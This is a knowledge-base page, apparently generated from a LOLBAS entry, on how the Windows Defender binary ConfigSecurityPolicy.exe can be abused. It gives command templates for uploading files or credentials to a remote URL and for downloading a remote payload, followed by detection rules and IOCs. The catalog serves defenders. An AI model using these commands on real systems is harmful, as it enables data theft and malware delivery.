---
title: "ConfigSecurityPolicy.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/ConfigSecurityPolicy.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "ConfigSecurityPolicy.exe"
functions:
  - "Upload"
  - "Download"
attack_technique_ids:
  - "T1567"
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# ConfigSecurityPolicy.exe

Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.

## Metadata

- Category: OSBinaries
- Created: 2020-09-04
- Author: Ialle Teixeira
- Source Path: yml/OSBinaries/ConfigSecurityPolicy.yml

## Paths

- `C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe`
- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe`

## Commands

### 1. Upload

Upload file, credentials or data exfiltration in general

```cmd
ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
```

- Use Case: Upload file
- Privileges: User
- Operating System: Windows 10
- ATT&CK: [[kb/attack/techniques/T1567-exfiltration_over_web_service|T1567]]

### 2. Download

It will download a remote payload and place it in INetCache.

```cmd
ConfigSecurityPolicy.exe {REMOTEURL}
```

- Use Case: Downloads payload from remote server
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_configsecuritypolicy.yml
- IOC: ConfigSecurityPolicy storing data into alternate data streams.
- IOC: Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS.
- IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe.
- IOC: User Agent is "MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"

## Resources

- {'Link': 'https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-switch-workloads'}
- {'Link': 'https://docs.microsoft.com/en-US/mem/configmgr/comanage/workloads'}
- {'Link': 'https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-monitor'}
- {'Link': 'https://twitter.com/NtSetDefault/status/1302589153570365440?s=20'}

## Acknowledgements

- {'Person': 'Ialle Teixeira', 'Handle': '@NtSetDefault'}
- {'Person': 'Nir Chako (Pentera)', 'Handle': '@C_h4ck_0'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml)
